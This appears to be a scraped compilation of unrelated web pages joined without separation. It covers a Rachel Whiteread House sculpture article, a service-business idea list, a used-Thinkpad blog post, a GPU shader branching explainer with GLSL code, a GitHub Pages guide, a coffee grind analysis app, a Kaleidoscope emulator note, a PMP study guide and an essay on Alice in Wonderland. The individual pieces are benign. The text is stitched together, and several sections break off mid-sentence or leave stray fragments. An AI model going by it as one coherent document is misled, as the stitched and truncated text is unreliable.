<p>Mr Gale forcefully resisted eviction from No. 193 by the council for a number of years, even festooning the property with banners to affirm his unrelenting presence, but, realising his campaign was ultimately futile, he eventually yielded and was re-homed nearby. Gale’s loss was artist Rachel Whiteread’s gain. The practitioner had been seeking a condemned property in London for over two years to realise a project which was essentially a development upon her Turner Prize nominated sculpture, Ghost (1990); a room-sized cast of a bedsit contained in a Victorian property in Archway.</p>



<p>Whiteread, supported by art commissioners Artangel, approached the London Borough of Tower Hamlets&nbsp;council about utilising the property and the authorities duly consented. In the beginning, the council were of the opinion that, ‘It won’t cost the neighbourhood a penny and will provide an unusual landmark for the area,’ however, by the time the bricks were removed and the sculpture was exposed, Councillor Flounders, Chair of Bow Parks Board, denounced it as ‘excrescent.’</p>



<h2>Building Rachel Whiteread’s House</h2>



<figure><img loading="lazy" width="1024" height="692" src="https://romanroadlondon.com/wp-content/uploads/2019/09/Rachel-Whiteread-house-credit-David-Hoffman-1024x692.jpg" alt="Rachel Whiteread's House on Grove Road in Bow, photo by David Hoffman" srcset="https://romanroadlondon.com/wp-content/uploads/2019/09/Rachel-Whiteread-house-credit-David-Hoffman-1024x692.jpg 1024w, https://romanroadlondon.com/wp-content/uploads/2019/09/Rachel-Whiteread-house-credit-David-Hoffman-300x203.jpg 300w, https://romanroadlondon.com/wp-content/uploads/2019/09/Rachel-Whiteread-house-credit-David-Hoffman-768x519.jpg 768w, https://romanroadlondon.com/wp-content/uploads/2019/09/Rachel-Whiteread-house-credit-David-Hoffman.jpg 1500w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Rachel Whiteread’s house view of Grove Road © David Hoffman</figcaption></figure>



<p>To make House, Whiteread used the physical house as&nbsp;a&nbsp;mould, making a cast from the interior by spraying a skin of liquid concrete around a metal armature constructed to support the weight of the work. Coating the whole house took over a month and an additional ten days were needed for the concrete to cure and set. Once solid, scaffolding was erected and Whiteread and her assistants began to remove the exterior brick structure.</p>



<p>What was revealed was an uncanny sight – the concrete impressed with the idiosyncrasies of over a century of domestic habitation. Depressions translated into protrusions; the industrial material betraying past human intimacies: soot marking the fire; yellow paint from a top-floor bedroom. The floors in-between stories could not be cast so, as local Markham Hall recalls, it resembled a ‘wedding cake.’ But the marriage at hand, between the art world and the East End, was to be short-lived and volatile.</p>



<h2>Reactions to Rachel Whiteread’s House</h2>



<p>It was essentially a neutral process, with no specific moral agenda, but Whiteread conceded ‘I knew of course, while I was making House, it had a political dimension. You can’t make a cast of a house in a poor area of London and not be political.’ Yet it became ‘far more political than I could have predicted.’ Seemingly, the council had also underestimated its resonance, as it quickly became front-page news, attracting scores of art-pilgrims and causing traffic chaos. Its status was even brought to debate in the House of Commons. The council couldn’t wait to get rid of the work fast enough, coming to regard it as a politically embarrassing monument to an impoverished history and standing in the way of the construction of a less threatening green space.</p>

Why Not? © David Hoffman</figcaption></figure>



<p>People reacted to House so strongly as it transcended the individual and became an archetype; an emblem for the area’s time-honoured mode of living. Indeed, it raised pressing questions regarding degrading housing stock and what should be done with it, the creeping gentrification of a historically tight working class community and scepticism towards the authority of those instigating change for the supposed ‘greater good’. In whose name was this change really for? And poignantly, it confronted these questions on its own material terms – concrete being the material used to fix the original Victorian House’s bricks; the embossed surface betraying the umbilical cords of pipes and power-lines which linked the individual house with the local, national and global public.</p>



<p>At base, Whiteread made an empty space, the negative void of the vacated property, into a positive object but insists ‘the work is to do with absence not presence.’ Implicitly, House was defined by the object it was not. When one refers to a ‘house’ we generally mean the façade as publicly viewed from the street, the interior is intimate – that is the home. Whiteread’s sculpture was resolutely an interior; an unsettling mass of inside, out.</p>



<p>The form elicited unease as when we have an intimate relationship with a space, we start to ignore its intricacies, instead handling navigating through the general form unconsciously. Thus, the sculpture was uncanny as it solidified the overlooked, demanding a long-looking, deep contemplation, as one attempted to decipher the inverted forms. Whiteread neglected to furnish her House with meaning but it was predominantly envisioned as what the populace of Bow would soon lose sight of. The interior, a family home, was left out in the cold and significantly, Whiteread chose not to cast the attic space, as if riffing on the idiom ‘left with no roof over their heads.’</p>



<p>It’s understandable then, that there was some resentment from locals towards House as they perceived it to be adding insult to injury over the demolition of such homes in the area, and a crassness in exposing working-class abode for the ‘arty’ leisure classes. Yet, this wasn’t just a case of Art World vs. East Enders, the opinions were split within both camps: in the Art World, Andrew Graham-Dixon proclaimed it ‘a strange and fantastical object which also amounts to one of the most extraordinary and imaginative public sculptures created by an English artist this century.’ To Brian&nbsp;Sewell, it was a ‘meritless gigantism.’ Sewell’s scorn found resonance in one local’s assertion that ‘an engineer could have done it; I don’t see it as creative.’ Whereas, another neighbour to the site regarded it as ‘brilliant,’ reckoning it to be ‘a new way of looking at traditional things.’</p>



<p>House’s evicted resident, Mr Gale, protested, ‘They’re taking the wee-wee.’ He questioned, ‘How can they get grants for arts projects when we can’t get grants for homes? I could have bought a new home for my family with this money.’ His sentiment was echoed in graffiti scrawled on the sculpture: ‘WOT FOR?’ Another renegade scribe rebuffing ‘Why not!’</p>



<p>House’s economics became even more contentious when Whiteread won the £20,000 Turner Prize for the work (the first woman to receive the honour), and then £40,000 from the rebel K Foundation (composed of members of the defunct pop group KLF) for the ‘worst artist of the year.’ Whiteread split the latter money between Shelter, a charity for the London’s homeless, and a fund to supplement young artists. On the same day, the&nbsp;Council made the decision to refuse House a stay of execution. By this time, many people (philanthropists, dealers, galleries) had offered to purchase House, but money offered to the Council to retain its presence was blasted by the authorities as ‘bribes.’ In any case, Whiteread was adamant that the sculpture was ‘absolutely specific to the site’ thus preferred its destruction to relocation.</p>



<p>The bulldozers came on January 11th 1994. The <em>East London Advertiser</em> reports that ‘art lovers’ chained themselves to the railings in attempt to save the work, quoting one as protesting, ‘We’re doing this because House represents the destruction of not only homes but whole communities in East London.’ Another suggested its removal was a sacrilegious act, perceiving House as ‘a headstone to the houses that were here.’ But the sculpture’s fate was sealed. As Whiteread succinctly mused ‘it took three and a half years to develop, four months to make, and thirty minutes to demolish.’</p>



<h2>The legacy of Rachel Whiteread’s House</h2>



<p>The Houseless Park has now had over 20 years to bed in to the community’s psyche and flourish naturally. In all of the articles and art history books I have trawled to substantiate …</p></div></div>

<div><p>Want to start an online service-based business or start an agency?</p><p>Here are 117 examples of services you can sell online, in 6 different categories. </p></div>



<h2>Why we made this list:</h2>



<div><p><strong>1. To inspire you.</strong></p><p>Lots of entrepreneurs mention that one of their biggest obstacle to starting a company is finding what to work on. This list gives you not only ideas, but also examples of real successful businesses built on those ideas.</p><p><strong>2. To show you can build a successful business around one service.</strong></p><p>You don’t need to do more (or offer more) to be successful when running a service business. Pick one service (e.g. <em>Website-as-a-service</em>), one niche (e.g. <em>Lawyers</em>) and get started (e.g. <em>Done-for-you websites for lawyers</em>).</p></div>







<div><p>E-commerce is a huge industry that is <a href="https://www.statista.com/statistics/379046/worldwide-retail-e-commerce-sales/">projected to grow to 6.54 trillion</a> (yes, trillion) US dollars by 2022.</p><p>Can you grab a slice of this by helping e-commerce sellers with one of their tasks?</p><p>Take marketplaces for example: Etsy,&nbsp; Amazon, Red Bubble, PoshMark, Teespring) or any e-commerce platforms (Shopify or Woocommerce are two examples that come to mind), you can probably build a service just for one marketplace or platform and be successful with that.</p><p><strong>Examples of e-commerce services:</strong></p><p>1.

<p>2020-10-23</p>
<p>For my current job I knew I wanted a Linux laptop again, after enough exposure to Apples ecosystem. Naturally a Thinkpad came to mind as an option, but I wanted to give used hardware a chance, given that Thinkpads are known to be reliable and well built.</p>
<p>I went with used/refurbished hardware from a vendor I know and trust for a while now, <a href="https://www.lapstore.de/">lapstore.de</a>, and I could not be happier with my choice. I went with a Lenovo Thinkpad T460s, as a compromise between decent performance, weight, screen size and good Linux support out of the box. This model is 5 years old, but CPUs are not evolving that fast anymore, so it still feels very snappy with everything I'm doing. The internal screen could have used a slightly higher resolution for my taste, but I am rarely using it these days.</p>
<p>One big advantage of the older models is access to the old version of the docking stations, which are totally worth it. At home the laptop sits there, gets charged and drives my 4K display easily, while being hooked up to my mouse, keyboard and network cable. Speaking of ports: the T460s still has proper Rj-45, USB 2.0/3.0 and HDMI ports. No adapters needed!</p>
<p>Summing up, here is why I think used hardware is worth considering:</p>
<ul>
<li>it is cheaper. Sure, your employer might be paying for it, but maybe you have a fixed budget and get more out of it this way.</li>
<li>it is good for the environment.</li>
<li>it will likely last for the next few years. Most of us don't need the latest hardware to do our job. I would argue that quite a bit of software could run better if developers weren't handed the latest and greatest hardware as a given</li>
<li>you are not giving up support. Sure, it might break. But so does a new one. There are quite a few respectable dealers out there who offer 3 years of warranty for little extra cost. Actually the first (used) docking station I got was not working ok, so I got an immediate, brand new replacement 2 days later.</li>
<li>Linux runs great on older hardware. With Kubuntu 20.04 everything works out of the box, including webcam, multimedia keys, docking/undocking or switching between different screen configurations.</li>
</ul>
<p>Why not give used hardware a try?</p>
<p>EDIT [2020-10-27] fixed typo "wantec"</p>


<ul>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
 <div>
  
  <p><label>Posted on <strong>26 October 2020</strong></label></p><p>An <a href="https://www.google.com/search?q=three+weeks&amp;oq=three+weeks">eternity</a> ago, I published a <a href="https://www.peterstefek.me/focused-render.html">blog post</a> about a shader I wrote. In that post, I casually repeated a piece of gpu folklore I picked up as a wee opengl enthusiast almost a decade ago,   </p>
<p>
"Using if statements inside a shader will cause performance degradation."  
</p>

<p>People on the internet seemed a little skeptical about this statement, and I realized my advice might be outdated. So this post is a quick follow up about the cost of branching on more modern gpus.  </p>
<p>Before we talk about branching, what is a gpu? A GPU or graphics processing unit, is a special piece of hardware initially developed to crunch numbers for graphics calculations. It accomplishes this goal quickly through a large amount of parallelization.   </p>
<p>GPUs can run many threads at the same time in parallel. These threads are generally executed in groups called warps (CUDA), invocations (Vulkan) and waves (I will use the term warp, but they are all interchangeable). On recent Nvidia hardware (Ampere/ Volta / Pascal) these warps contain 32 threads. Pascal for example can theoretically run up to four independent instructions per warp over 56 warps of 32 threads which comes out to a mind blowing 7168 instructions per cycle. </p>
<p>Each warp can only execute one instruction at a time. However that instruction can be executed for each of the threads in the warp. This means the GPU can execute 32 copies of the same instruction in parallel for each thread in the warp at once.   </p>
<p>However, taking both sides of a branch will cause the threads inside a warp to "diverge". This means some threads will need to execute one side of the branch and some will need to execute the other. Unfortunately, both instructions can not be executed simultaneously for threads in the same warp. So these divergent instructions must be executed sequentially.   </p>
<p>
    <img src="https://www.peterstefek.me/images/shader-branch/pascal-divergence.png" width="65%"> 
</p>

<p>The above image is taken from the Volta whitepaper.  </p>
<p>Consider the <a href="https://www.shadertoy.com/view/WdyyWV">following fragment shader</a>:<br>
<code>
void mainImage( out vec4 fragColor, in vec2 fragCoord )
{  <br>
  </code></p><p><code>
  // TUNE THIS AMOUNT TO YOUR GPU STRENGTH<br>
  int workAmount = 2000;<br>
  float incr = 1. / float(workAmount);<br>
  float outColor = 0.0;  
<p>// USE THIS VARIABLE TO TOGGLE BRANCHING<br>
  bool branch = true;  </p>
<p>if (mod(fragCoord.x, 2.) &lt; 1. &amp;&amp; branch) {
    </p><div><p>
      for (int i = 0; i &lt; workAmount; i++) {
        </p><p>
          outColor += incr;
          </p><p>
      }<br>
      fragColor = vec4(0.0,outColor,0.0,1.0);
      </p></div>
  } else {
    <div><p>
      for (int i = 0; i &lt; workAmount; i++) {
        </p><p>
          outColor += incr;
          </p><p>
      }<br>
      fragColor = vec4(outColor,0.0,0.0,1.0);
      </p></div>
  }
  </code></p><p><code>
}
</code></p>
<p>In fragment shaders like the one above, each warp is composed of a set of spatially close pixels. Each warp in this shader should diverge because each horizontally adjacent pixel takes a different side of the branch. Let's say the cost of each inner loop is n cycles. Since each side of the branch is executed in series, each warp must take at least 2n cycles, even though each thread uses only one side of the branch. These effects scale with the number of threads in the distinct divergent paths taken (up to 32x in Nvidia hardware). Here's another shader which should have roughly four branches per warp. <a href="https://www.shadertoy.com/view/wsVyzG">This shader</a> will take at least 4n cycles.  </p>
<p>However, let's look a <a href="https://www.shadertoy.com/view/tsVyzG">second shader</a>:   </p>
<p><code>
void mainImage( out vec4 fragColor, in vec2 fragCoord )
{
  </code></p><p><code>
  // USE THIS VARIABLE TO TOGGLE BRANCHING<br>
  int workAmount = 2000;<br>
  float incr = 1. / float(workAmount);<br>
  float outColor = 0.0;  
<p>// USE THIS VARIABLE TO TOGGLE BRANCHING<br>
  bool branch = true;  </p>
<p>if (fragCoord.x &lt; iResolution.x / 2.0 &amp;&amp; branch) {
    </p><div><p>
      for (int i = 0; i &lt; workAmount; i++) {
        </p><p>
          outColor += incr;
          </p><p>
      }<br>
      fragColor = vec4(0.0,outColor,0.0,1.0);
    </p></div>
  } else {
    <div><p>
        for (int i = 0; i &lt; workAmount; i++) {
          </p><p>
          outColor += incr;
          </p><p>
      }<br>
      fragColor = vec4(outColor,0.0,0.0,1.0);
      </p></div>
  }
  </code></p><p><code>
}
</code></p>
<p>This shader should run roughly twice as fast as the other shader even though roughly the same number of pixels take each branch. This is because most of the warps do not diverge (with the exception of a few around half way across the screen).   </p>
<p><strong>Nvidia Specifics</strong><br>
As far as I can tell, there are roughly two different ways of nvidia graphics cards handle divergence with in a warp.</p>
<p><strong>Thread Masking (Pre Volta)</strong><br>
On pre volta Nvidia card, divergence was handled by something called thread masking.   </p>
<p>Basically when a conditional is hit, a thread mask is generated.  We can think of this mask as a 32 entry array. Each entry specifies whether the corresponding thread takes the first side of the branch or not. The first side is then executed for each of those threads. After the first side of the branch is then executed, the mask is reversed and the other side of the branch is executed.   </p>
<p>This thread mask strategy exists in part because there is only one program counter per warp on pre volta gpus. So essential every thread in the warp must be at the same place in the program. The only way we know which threads to execute, is by using the mask.</p>
<p>
    <img src="https://www.peterstefek.me/images/shader-branch/pascal-divergence.png" width="65%"> 
</p>

<p>The above image is taken from the Volta whitepaper.</p>
<p>It's worth noting that only the threads which need to execute the branch actually are assigned to computational cores. So if no threads execute one side of the branch, no work is done.</p>
<p><strong>Independent Thread Scheduling (Volta and Beyond)</strong><br>
One big change in the Volta architecture and beyond is the introduction of "Independent Thread Scheduling".   </p>
<p>In Independent thread scheduling, each thread has its own program counter. This allows each warp to track the execution of every thread at a fine grain level. However, we can still only execute only one instruction at a time. So the actual runtime of a branch does not change.  </p>
<p>So if Independent Thread Scheduling does not speed up branching, what does it do? Independent Thread Scheduling enables both sides of a branch to execute concurrently but not in parallel.   </p>
<p>
    <img src="https://www.peterstefek.me/images/shader-branch/volta-divergence.png" width="65%"> 
</p>

<p>The above image is taken from the Volta whitepaper.</p>
<p>The reason for this shift is because before Volta, branches were places where deceptive deadlocks could occur. <br>
<code>
leader_id = 0<br>
If (threadIdx.x == leader_id) {<br>
  </code></p><p><code>
    // Do some inital work
  </code></p><p><code>
} else {
  <p>
    // Wait for leader to finish it's work<br>
    // then do my work
  </p>
}<br>
</code></p>
<p>In the above compute shader pseudo code, we have 31 "follower" threads waiting for the "leader thread" to finish (using in-warp shared local memory) before executing their own instructions. </p>
<p>On a Pascal GPU or below, if the else side of the branch is executed first, a deadlock will occur. The leader will never get a chance to start it's work because its followers will be waiting for it. </p>
<p>Independent Thread Scheduling gets around these locking problems by interlacing the two diverging paths. </p>
<p><strong>Article TLDR</strong><br>
Branch divergence in warp makes all parts of the branch execute in sequence which slows down the shader. Branching divergence between warps does not affect runtime.  </p>
<p><strong>Further Reading</strong><br>
Branch execution on gpus is surprisingly deep, and there are many edge cases I didn't address and I also didn't touch gpu vendors other than Nvidia. Here are some good sources if you want to learn more:  </p>

<p><strong>What this guide is for:</strong> This guide is laser-focused on one thing: showing how to get a working informational website up and running as fast
as possible using GitHub Pages, using only the GitHub website. <em>Informational website</em> is an informal term meaning that the emphasis is on
function (structured text with simple formatting, links, images) and not form (intricate page design). It goes step by step from the very beginning
and assumes very little knowledge on your part.</p>

<p>You don’t need to learn command-line programs like Git, or install anything
on your own computer. Everything taught here does apply to advanced use patterns when you get more experienced.</p>

<p>GitHub Pages is free if your repository (file storage area) is public.</p>

<p><strong>Ways to view this site</strong></p>
<ul>
  <li><a href="https://tomcam.github.io/least-github-pages/">Github Pages</a></li>
  <li>Directly on <a href="https://github.com/tomcam/least-github-pages/">Github</a></li>
</ul>

<p>If you were pointed here by an employer or well-meaning friend and aren’t quite sure why, 
you can find plenty of reasons in <a href="https://tomcam.github.io/least-github-pages/why-use-github-pages.html">Why Use GitHub Pages?</a></p>

<p><strong>What you can get out of this guide:</strong>  If you follow through the steps in this guide you’ll have a small website demonstrating everything you need to put up an attractive, easy to maintain site using words, links, and images. 
Not covered are advanced topics such as using Git on the command line, custom themes, SEO, version control,
and advanced features of GitHub-flavored Markdown.</p>

<h2 id="intended-audience">Intended audience</h2>

<p>GitHub Pages uses <a href="https://jekyllrb.com/">Jekyll</a>, a publishing system based on the Ruby programming language. The Jekyll documentation is excellent, especially if you already know Jekyll, program in Ruby, and have both Ruby and Jekyll installed on your local computer. The GitHub Pages documentation is comprehensive and excellent–if you’re already a Jekyll expert.</p>

<p><a href="https://tomcam.github.io/least-github-pages/">The Least You Need to Know About GitHub Pages</a> is designed for people who don’t happen to know Jekyll already but who need to get up to speed in GitHub Pages quickly to get a job done <em>now</em>. It tells you not only <em>what</em> to do step by step,
but also briefly explains <em>why</em> you’re doing it.</p>

<p>You probably don’t want to use GitHub Pages on sites that require complex, individual formatting on a per-page basis. 
GitHub Pages uses Markdown, which has some limited formatting information but not a lot.
GitHub Pages then uses Jekyll to turn that Markdown into HTML, based on the Jekyll theme you’ve chosen. Generally speaking this approach is
absolutely ideal for blogs, technical documents and instructional materials that require versioning and collaboration, where the
main work product is words and pictures. It is not a good fit for things like boutique pages, restaurant menu sites, consumer product sites, and so on where
custom formatting is the norm.</p>

<p>[Edit April 25 2019: Please note <strong>this is not an iPhone or Android app</strong>, and I have no plans to release it as such. You can use your phone or any other camera to take pictures of your ground coffee, but then you need to install the application on either OS X or through Python (on any operating system) to analyze the data. <a href="https://github.com/jgagneastro/coffeegrindsize/archive/master.zip">Download the application package here</a>.]</p>



<p>Today I would like to present an OS X application I have been developing for a few months. It turns out writing Python software for coffee is a great way to relax after a day of writing Python software for astrophysics.</p>



<p>When I started being interested in brewing specialty coffee a few years ago, one of the first things that irritated me was our inability to recommend grind sizes for different coffee brewing methods, or to compare the quality of different grinders in an objective way. Sure, some laboratories have laser diffraction equipment that can measure the size of all particles coming out of a grinder, but rare are the coffee geeks that have access to these multi-hundred thousands of dollars kinds of equipment.</p>



<p>At first, I decided to take pictures of my coffee grounds spread on a white sheet, and to use an old piece of software called <a href="https://imagej.nih.gov/ij/">ImageJ</a>, developed by the National Institutes of Health mainly to analyze microscope images, to obtain a distribution of the sizes of my coffee grounds. This worked decently well, and allowed me to start comparing different grinders. Then <a href="https://www.scottrao.com/">Scott Rao</a> made me realize that a stand-alone application that doesn’t need a complicated installation and that is dedicated to coffee would be of interest to many people in the coffee industry. Probably just the 10% geekiest of them, but that’s cool.</p>



<p>I’m hoping that this application will help us understand the effects of particle size distributions on the taste of coffee. I don’t think the industry really kept us in the loop with all the laser diffraction experiments, so hopefully we can help ourselves as a community.</p>



<p>If you are interested in measuring the particle size distribution of your grinder, then this app is for you ‒ and it’s free. I placed it as “open source” on <a href="https://github.com/jgagneastro/coffeegrindsize">GitHub</a>, so if you are a developer, you are welcome to send me suggestions in the form of <em>push requests</em> (the developers will know what that means).</p>



<p>If you would like to get started, I suggest you read this quick <a href="https://github.com/jgagneastro/coffeegrindsize/blob/master/Help/coffee_grind_size_installation.pdf">installation guide</a>, which will explain how to download the app and run it even though I am not a registered Apple Developer. Then, you can choose to either read this <a href="https://github.com/jgagneastro/coffeegrindsize/blob/master/Help/coffee_grind_size_summarized_manual.pdf">quick summary</a> that will get you running with the basics, or this <strong><em>very</em></strong> detailed and wordy <a href="https://github.com/jgagneastro/coffeegrindsize/blob/master/Help/coffee_grind_size_manual.pdf">user manual</a> that will guide you through all the detailed options the application offers you.</p>



<p>I would like to show you an example of what can be done with the software. Below, I am comparing the particle size distribution of the Baratza Forté grinder, which uses 54 mm flat steel burrs, with that of the Lido 3 hand grinder, which uses 48 mm conical steel burrs. I set both grinders in a way that produces a similar peak of average-sized particles with diameters around 1 mm, but as you can see, the particle size distributions are very different ! The Forté generates way less fines (with diameters below 0.5 mm) and slightly less boulders (with diameters of approximately 2 mm), which is indicative of a better quality grinder.</p>



<figure><img data-attachment-id="976" data-permalink="https://coffeeadastra.com/lido3_size9_file10_hist_mass_diam/" data-orig-file="https://coffeeadastra.files.wordpress.com/2019/01/lido3_size9_file10_hist_mass_diam.png" data-orig-size="1000,780" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="lido3_size9_file10_hist_mass_diam" data-image-description="" data-medium-file="https://coffeeadastra.files.wordpress.com/2019/01/lido3_size9_file10_hist_mass_diam.png?w=300" data-large-file="https://coffeeadastra.files.wordpress.com/2019/01/lido3_size9_file10_hist_mass_diam.png?w=750" src="https://coffeeadastra.files.wordpress.com/2019/01/lido3_size9_file10_hist_mass_diam.png" alt=""><figcaption>An example of figure that can be generated with the coffee grind size software. Each red bar corresponds to one kind of particle diameter generated by the Lido 3 grinder (smallest particles correspond to the leftmost bar, largest ones correspond to the rightmost bar), and their heights correspond to the total contribution of these kinds of particles, by mass. As you can see, the particles that contribute to the largest amount of mass have sizes just above 1 mm. The red circle shows the average particle diameter for the Lido 3, and the horizontal bars show the “characteristic width” of the distribution – this corresponds to the width that covers approximately 68% of all the distribution. Similarly, the blue line and the blue circle describe the distribution of the Forté grinder.</figcaption></figure>



<p>For now, the app is only intended to be used on OS X computers. But if you are running any other kind of system and know your way around Python, you can always download it directly from <a href="https://github.com/jgagneastro/coffeegrindsize">GitHub</a> and run it with your own installation of Python 3.</p>



<figure><video controls="" src="https://www.dropbox.com/s/66ug5i9bkhrghef/screencap_coffeegrindsize.mov?raw=1"></video><figcaption>This is an example of how to use the coffee grind size application.</figcaption></figure>



<p>I would like to thank Scott Rao for his excitement when I shared this project idea with him, and for beta testing the software. I would also like to thank Alex Levitt, Mitch Hale, Caleb Fischer, Francisco Quijano and Victor Malherbe for beta testing the software.</p>

  <div>
    <p>I recently came across a <a href="https://www.quaxio.com/files/2020/kaleidoscope/kscope.txt">piece of assembly</a> code, written by Li-Chen Wang, which
displays a Kaleidoscope. This code was written in 1976, and distributed for $15
on a <a href="https://upload.wikimedia.org/wikipedia/commons/thumb/2/27/Kaleidoscope_for_Cromemco_Dazzler.jpg/1920px-Kaleidoscope_for_Cromemco_Dazzler.jpg">punched tape</a>. It appears this was one of three pieces of code used to
demonstrate the capabilities of <a href="https://en.wikipedia.org/wiki/Cromemco_Dazzler">Cromemco's Dazzler</a>, the first commercial
color graphics card for microcomputers.</p>

<blockquote>Stan Veit, owner of the Computer Mart of New York, described the reaction
  when he displayed the changing patterns of Kaleidoscope on a color television
  in his store window at the corner of 5th Avenue and 32nd Street in New York
  City in early 1976. “People driving by began to stop and look – they had never
  seen anything like it before. In a short time the Dazzler had caused a traffic
  jam on 5th Avenue!” The police had to contact the building landlord and make
  him disconnect the television.</blockquote>

<p><a href="https://en.wikipedia.org/wiki/Li-Chen_Wang">Dr. Li-Chen Wang</a> made quite some important
contributions resulting in the growth of the computer industry, such as a free
and open source BASIC interpreter as well as pioneering the concept of free software.</p>

<p>It turns out running this code from the dawn of computers in a browser isn't
too hard. The code is 127 bytes long. I found an existing <a href="https://github.com/maly/8080js">8080 emulator</a>. With the help of this <a href="https://www.quaxio.com/files/2020/kaleidoscope/cromemco_dazzler_manual.pdf">technical manual</a>, I wrote
the <a href="https://www.quaxio.com/files/2020/kaleidoscope/kaleidoscope.js">bare minimum amount of code</a> to emulate a Dazzler. Computer manuals back then were very detailed, especially for hardware that came as a kit, requiring a day or two of soldering.</p>

<p>Below is the result of running the code. In a subsequent post, I will cover how the code actually works.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Aside from software development, I also enjoy studying other related fields like marketing, project management, and product management.</p><p>Any reasonably sized software needs planning to be executed properly and after you "finish it" (a software product is never actually "done"), you need to market it to the public in order to make sales.</p><p>In this article, I will describe the process I took to become a Project Management Professional (PMP) by the Project Management Institute (PMI), one of the most sought certifications, not only in project management but in the market as a whole.</p><p>I was able to start my studies and take the test successfully in 2 months, studying between 3 and 4 hours a day, every day, weekends included, and get the results below:</p><p>Overall performance:</p><p><img src="https://renanmf.com/wp-content/uploads/2020/10/pmp-overall-performance.png" alt="Initial"></p><p>Performance by domain:</p><p><img src="https://renanmf.com/wp-content/uploads/2020/10/pmp-exam-breakdown.png" alt="Initial"></p><h2>What is the PMI and the PMP?</h2><p>The PMI (Project management institute) is the main organization when you think about project management.</p><p>Project Management varies a lot from place to place, from project to project, and from industry to industry, but there are some standards across all of those that are considered general best practices.</p><p>The PMI publishes the PMBoK (Project Management Body of Knowledge), which is a guide of best practices in project management.</p><p>The PMBoK is <strong>not</strong> a methodology, the project team needs to decide which processes will be applied according to their needs.</p><p>The PMBoK is usually updated every 4 or 5 years with new practices and a review of the current ones.</p><h2>PMP Certification requirements</h2><p>To apply for the test, you have to meet some criteria as described by the official PMI page:</p><ul><li>A four-year degree</li><li>36 months leading projects</li><li>35 hours of project management education/training or CAPM® Certification</li></ul><p><strong>OR</strong></p><ul><li>A high school diploma or an associate’s degree (or global equivalent)</li><li>60 months leading projects</li><li>35 hours of project management education/training or CAPM® Certification</li></ul><p>You can find everything you need to know about the application and the certification process itself on the official page of the exam at <a href="https://www.pmi.org/certifications/project-management-pmp">Project Management Professional (PMP)®</a>.</p><h2>What do you need to prepare</h2><p>I had 3 things at hand to prepare:</p><ul><li><a href="https://www.pmi.org/pmbok-guide-standards/foundational/pmbok">The PMBoK</a></li><li><a href="https://www.amazon.com/PMP-Exam-Prep-Eighth-Updated/dp/1932735658">Rita Mulcahy’s PMP Exam Prep</a></li><li>An exam simulator</li></ul><h3>The PMBoK</h3><p>This is PMI’s official resource to study. In a sense, it contains everything you need regarding topics.</p><p>The problem is that the PMBoK alone is a little too dry to study for the exam and it doesn’t have exercises to practice.</p><p>This is simply because the PMBoK is a reference book, not a study guide.</p><p>The best way to get a copy is to register as a PMI Associate. As an associate, you get a free copy of the PMBoK and you also get a good discount on the exam fee.</p><h3>Rita Mulcahy’s PMP Exam Prep</h3><p>This is the book you want to have with you as your best friend.</p><p>Unlike the PMBoK, Rita’s book is a written course to help you organize ideas and absorb the topics of the exam with questions at the end of each chapter.</p><p>This one is a must, although kind of expensive, but not so much if you compare it with a live or online course that might cost you thousands of dollars instead of a few hundred like the book.</p><p>And the book has a huge advantage compared to a course: you can resell the book to somebody else and recover most of the investment you made or you can even buy a used copy from someone and save a buck.</p><h3>Exam simulator</h3><p>I did the exam back in 2018 and the simulator I used is no longer available, so I won’t recommend any specific simulator because I only recommend things I have used and can guarantee they actually work.</p><p>You can search for a "PMP exam simulator" on the internet and find lots of them.</p><p>Look for reviews to find a good one, these might be pricey, but they are worth it if you want to pass the exam.</p><p>A good simulator should allow you to practice questions by specific areas, so you can focus on one at a time when studying.</p><p>And, of course, they must have a good enough amount of questions so you can practice at least 2 complete exams, similar to the one you are actually going to take on the test day.</p><h2>How to study</h2><p>You might not be able to take the exam in 2 months and that’s ok! Actually, most people take between 3 and 6 months of study before taking the exam.</p><p>I will describe the process I used to study, each person has a rhythm and different constraints in life, so adapt this to a schedule you can actually keep.</p><p>1 – Read Rita’s book in parallel with the PMBoK, then answer the questions at the end of each chapter of Rita’s book.<br> 2 – Once a week, at least, answer questions on the exam simulator by area. Do not attempt to mix questions of many areas at first, let each one sink in.<br> 3 – Review the areas in which you are not scoring well in the simulator. You don’t need a perfect score and a good simulator will tell you where you should focus to get better.<br> 4 – Repeat steps 1,2, and 3 until you finish all the chapters in Rita’s book.<br> 5 – As soon as you feel comfortable, try as many complete exams simulator as you can, I would say something between 2 and 4 are enough.</p><p>I did 2 complete exams, on two different days, a week before the test.</p><p>You mustn’t let anyone distract you, lock yourself in a room and simulate the environment of the test so you get a feel of how to behave on the test day and how to manage your time appropriately.</p><h2>The exam day</h2><p>If you followed all steps described before and had good scores on the simulator, don’t worry, you are good to go!</p><p>Just one last tip: don’t get stuck on a question.</p><p>The exam is 4 hours long and has 200 questions, this means you have, on average 1.2 minutes per question!</p><p>Some questions will feel easier, some will feel harder, that’s normal, no one has all the answers, if you feel stuck on one question mark it for later and review it at the end if you have some time left.</p><p>Prepare well, keep calm, and good luck!</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Online discourse has recently been borrowing vocabulary from Lewis Carroll. From articles about the dangers 
of 
rabbit holes on social media, Youtube and Reddit, to QAnon's "follow the white rabbit" mantra, concepts from 
Alice's Wonderland seem to fit naturally with the internet.</p>
<p>In Lewis Carroll's book, Alice and the white rabbit are the only two characters that transition from reality 
to 
Wonderland. The white rabbit is driven by anxiety. Alice by curiosity. We are motivated to access 
the internet for these same reasons. Our curiosity is never satiated with endless content and powerful 
recommender systems. Our anxiety is consistently triggered by the fear of missing out and the need to escape 
reality.</p>
<p>Like Wonderland, the internet has become an alternate reality thanks to the breath of the content available 
and its multimedia nature. Wonderland resembled reality enough that Alice accepted it as real. The internet's 
information is realistic enough that people struggle to know what is real and what is fake.</p>
